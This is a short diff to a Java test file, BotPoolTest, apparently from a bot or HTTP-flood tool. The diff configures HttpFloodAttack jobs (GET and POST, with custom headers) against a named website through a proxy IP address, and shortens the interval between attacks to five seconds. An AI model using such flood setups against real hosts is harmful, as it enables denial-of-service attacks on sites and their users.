@@ -93,21 +93,21 @@ public class BotPoolTest {
     attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
         new HttpProxy("31.220.56.101", 80),
         3,
-        new Interval(10, 15, TimeUnit.SECONDS)
+        new Interval(5, 5, TimeUnit.SECONDS)
     ));
     attacks.add(new HttpFloodAttack(HttpMethod.GET, new URL("http://www.gmarciani.com"),
         new HttpProxy("31.220.56.101", 80),
         new HashMap<String,String>(){{put("User-Agent", "CustomUserAgent");}},
         new HashMap<String,String>(){{put("foo1", "bar1");}},
         3,
-        new Interval(10, 15, TimeUnit.SECONDS)
+        new Interval(5, 5, TimeUnit.SECONDS)
     ));
     attacks.add(new HttpFloodAttack(HttpMethod.POST, new URL("http://www.gmarciani.com"),
         new HttpProxy("31.220.56.101", 80),
         new HashMap<String,String>(){{put("User-Agent", "CustomUserAgent");}},
         new HashMap<String,String>(){{put("foo1", "bar1");}},
         3,
-        new Interval(10, 15, TimeUnit.SECONDS)
+        new Interval(5,5, TimeUnit.SECONDS)
     ));
 
     BotPool pool = new BotPool();
